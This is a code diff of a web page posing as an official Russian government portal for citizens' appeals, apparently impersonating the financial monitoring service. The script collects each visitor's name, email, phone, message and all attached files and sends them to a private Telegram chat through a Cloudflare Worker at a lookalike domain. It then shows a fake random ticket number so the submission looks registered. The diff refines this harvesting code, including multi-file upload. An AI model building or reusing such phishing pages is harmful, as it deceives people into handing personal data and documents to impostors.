@@ -145,61 +145,66 @@
     </nav>
 
     <div class="form-container">
-        <div class="section-title">Прием обращений граждан и организаций</div>
-        
-        <div class="notice-box">
-            <strong>Внимание!</strong> Обращения, направленные через настоящий электронный портал, регистрируются в установленном порядке в соответствии с Федеральным законом № 59-ФЗ «О порядке рассмотрения обращений граждан Российской Федерации».
+    <div class="section-title">Прием обращений граждан и организаций</div>
+    
+    <div class="notice-box">
+        <strong>Внимание!</strong>Обращения, направленные через настоящий электронный портал, регистрируются в установленном порядке в соответствии с Федеральным законом № 59-ФЗ «О порядке рассмотрения обращений граждан Российской Федерации».
+    </div>
+
+    <form id="appealForm" onsubmit="sendForm(event)">
+        <!-- ФИО Заявителя -->
+        <div class="form-group">
+            <label for="fullName">ФИО заявителя / Наименование организации *</label>
+            <input type="text" id="fullName" name="name" class="form-control" placeholder="Иванов Иван Иванович" required>
         </div>
 
-        <form id="appealForm" onsubmit="sendForm(event)">
-            
-            <div class="form-group">
-                <label for="fullName">ФИО заявителя / Наименование организации *</label>
-                <input type="text" id="fullName" name="name" class="form-control" placeholder="Иванов Иван Иванович" required>
-            </div>
+        <!-- Почта -->
+        <div class="form-group">
+            <label for="email">Электронная почта для ответа *</label>
+            <input type="email" id="email" name="email" class="form-control" placeholder="example@mail.ru" required>
+        </div>
 
-            <div class="form-group">
-                <label for="email">Электронная почта для ответа *</label>
-                <input type="email" id="email" name="email" class="form-control" placeholder="example@mail.ru" required>
-            </div>
+        <!-- Телефон -->
+        <div class="form-group">
+            <label for="phone">Номер телефона для связи *</label>
+            <input type="tel" id="phone" name="phone" class="form-control" placeholder="+7 (999) 123-45-67" required>
+        </div>
 
-            <div class="form-group">
-                <label for="phone">Номер телефона для связи *</label>
-                <input type="tel" id="phone" name="phone" class="form-control" placeholder="+7 (999) 123-45-67" required>
-            </div>
+        <!-- Тема -->
+        <div class="form-group">
+            <label for="subject">Тема обращения *</label>
+            <select id="subject" name="subject" class="form-control" required>
+                <option value="" disabled selected>Выберите тему...</option>
+                <option value="Сообщение о сомнительных операциях">Сообщение о сомнительных операциях</option>
+                <option value="Вопросы исполнения требований Федерального закона №-115">Вопросы исполнения требований Федерального закона №-115</option>
+                <option value="Запрос технической поддержки личного кабинета">Запрос технической поддержки личного кабинета</option>
+                <option value="Жалобы и предложения">Жалобы и предложения</option>
+                <option value="Другой вопрос">Другой вопрос</option>
+            </select>
+        </div>
 
-            <div class="form-group">
-                <label for="subject">Тема обращения *</label>
-                <select id="subject" name="subject" class="form-control" required>
-                    <option value="" disabled selected>Выберите тему...</option>
-                    <option value="Сообщение о сомнительных операциях">Сообщение о сомнительных операциях</option>
-                    <option value="Вопросы исполнения 115-ФЗ">Вопросы исполнения требований Федерального закона № 115-ФЗ</option>
-                    <option value="Техподдержка ЛК">Запрос технической поддержки Личного Кабинета</option>
-                    <option value="Жалобы и предложения">Жалобы и предложения</option>
-                    <option value="Другой вопрос">Другой вопрос</option>
-                </select>
-            </div>
+        <!-- Текст -->
+        <div class="form-group">
+            <label for="message">Текст обращения *</label>
+            <textarea id="message" name="message" class="form-control" placeholder="Подробно изложите суть вашего вопроса..." required></textarea>
+        </div>
 
-            <div class="form-group">
-                <label for="message">Текст обращения *</label>
-                <textarea id="message" name="message" class="form-control" placeholder="Подробно изложите суть вашего вопроса или заявления..." required></textarea>
-            </div>
+        <!-- Множественная загрузка файлов -->
+        <div class="form-group">
+            <label for="file">Прикрепить документы (выберите несколько):</label>
+            <input type="file" id="file" name="attachment" class="form-control" style="padding: 8px;" multiple>
+        </div>
 
-            <div class="form-group">
-                <label for="file">Прикрепить подтверждающие документы (PDF, PNG, JPG)</label>
-                <input type="file" id="file" name="attachment" class="form-control" style="padding: 8px;">
-            </div>
+        <div class="checkbox-group">
+            <input type="checkbox" id="agreement" required>
+            <label for="agreement">Я подтверждаю согласие на обработку персональных данных.</label>
+        </div>
 
-            <div class="checkbox-group">
-                <input type="checkbox" id="agreement" required>
-                <label for="agreement">Я подтверждаю свое согласие на обработку персональных данных Федеральной службой по финансовому мониторингу в рамках рассмотрения настоящего обращения.</label>
-            </div>
-
-            <button type="submit" class="btn-submit">Отправить официальное обращение</button>
-        </form>
-
-        <a href="index.html" class="btn-back">← Назад на главную</a>
-    </div>
+        <button type="submit" class="btn-submit">Отправить официальное обращение</button>
+    </form>
+    
+    <a href="index.html" class="btn-back">← Назад на главную</a>
+</div>
 
     <div id="successModal" class="modal-success">
         <div class="modal-content">
@@ -227,105 +232,73 @@
     </footer>
 
     <script>
-function sendForm(event) {
+async function sendForm(event) {
     event.preventDefault();
 
     const form = event.target;
     const button = form.querySelector('.btn-submit');
+    const fileInput = document.getElementById('file');
 
-    button.innerText = "Отправка в Узел Связи...";
+    button.innerText = "Отправка...";
     button.disabled = true;
 
-    // === НАСТРОЙКИ КАНАЛА СВЯЗИ ===
+    // Твой Worker
     const workerBaseUrl = 'https://round-band-482a.portal-rosfin.workers.dev';
     const TELEGRAM_CHAT_ID = '7386406575';
-    // ==============================
 
-    // Собираем данные из полей формы
-    const name = document.getElementById('fullName').value;
-    const email = document.getElementById('email').value;
-    const phone = document.getElementById('phone').value;
-    const subject = document.getElementById('subject').value;
-    const message = document.getElementById('message').value;
+    // Собираем текст
+    const textMessage = `📬 Новое обращение:\n\n` +
+                        `ФИО: ${document.getElementById('fullName').value}\n` +
+                        `Email: ${document.getElementById('email').value}\n` +
+                        `Телефон: ${document.getElementById('phone').value}\n` +
+                        `Тема: ${document.getElementById('subject').value}\n\n` +
+                        `Текст: ${document.getElementById('message').value}`;
 
-    // Формируем красивый текст для Telegram
-    const textMessage = `📬 *Новое обращение в приемную*\n\n` +
-                        `👤 *ФИО:* ${name}\n` +
-                        `📧 *Email:* ${email}\n` +
-                        `📞 *Телефон:* ${phone}\n` +
-                        `📌 *Тема:* ${subject}\n\n` +
-                        `📝 *Текст сообщения:* ${message}`;
+    try {
+        // 1. Текст (без parse_mode)
+        const textResponse = await fetch(`${workerBaseUrl}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: TELEGRAM_CHAT_ID, 
+                text: textMessage 
+            })
+        });
+        
+        const textData = await textResponse.json();
+        if (!textData.ok) throw new Error('Ошибка текста');
 
-    // Проверяем наличие файла
-    const fileInput = document.getElementById('file');
-    const file = fileInput && fileInput.files ? fileInput.files[0] : null;
+        // 2. Файлы
+        if (fileInput.files && fileInput.files.length > 0) {
+            for (let i = 0; i < fileInput.files.length; i++) {
+                const file = fileInput.files[i];
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
 
-    // 1. Отправляем текстовое сообщение на /sendMessage
-    fetch(`${workerBaseUrl}/sendMessage`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: textMessage,
-            parse_mode: 'Markdown'
-        })
-    })
-    .then(response => response.json())
-    .then(textData => {
-        if (!textData.ok) {
-            throw new Error('Ошибка при отправке текстовых данных.');
-        }
+                let method = file.type.startsWith('image/') ? '/sendPhoto' : '/sendDocument';
+                formData.append(file.type.startsWith('image/') ? 'photo' : 'document', file);
 
-        // 2. Если текст успешно ушел и пользователь прикрепил файл
-        if (file) {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-
-            // Определяем метод отправки в зависимости от типа файла
-            let method = '/sendDocument'; // По умолчанию шлем как документ
-            if (file.type.startsWith('image/')) {
-                method = '/sendPhoto';
-                formData.append('photo', file);
-            } else {
-                formData.append('document', file);
+                await fetch(`${workerBaseUrl}${method}`, {
+                    method: 'POST',
+                    body: formData
+                });
             }
-
-            // Шлем файл вторым запросом
-            return fetch(`${workerBaseUrl}${method}`, {
-                method: 'POST',
-                body: formData // Content-Type браузер выставит сам, как multipart/form-data
-            }).then(fileResponse => fileResponse.json());
         }
 
-        // Если файла не было, возвращаем имитацию успешного ответа
-        return { ok: true };
-    })
-    .then(finalData => {
-        if (finalData.ok) {
-            // Генерируем красивый случайный шестизначный номер тикета
-            const generatedNumber = Math.floor(100000 + Math.random() * 900000);
-            document.getElementById('ticketNumber').innerText = generatedNumber;
-            
-            // Показываем красивое модальное окно вместо alert
-            document.getElementById('successModal').style.display = 'flex';
-            form.reset(); 
-        } else {
-            alert("Основной текст получен, но вложенный файл отклонен сервером Telegram.");
-        }
-    })
-    .catch(error => {
+        // 3. Успех
+        document.getElementById('ticketNumber').innerText = Math.floor(100000 + Math.random() * 900000);
+        document.getElementById('successModal').style.display = 'flex';
+        form.reset();
+
+    } catch (error) {
         console.error('Ошибка:', error);
-        alert("Не удалось установить защищенное соединение. Проверьте Cloudflare Worker.");
-    })
-    .finally(() => {
+        alert("Ошибка соединения. Попробуйте с VPN.");
+    } finally {
         button.innerText = "Отправить официальное обращение";
         button.disabled = false;
-    });
+    }
 }
 
-// Функции управления модальным окном
 function closeModal() {
     document.getElementById('successModal').style.display = 'none';
 }
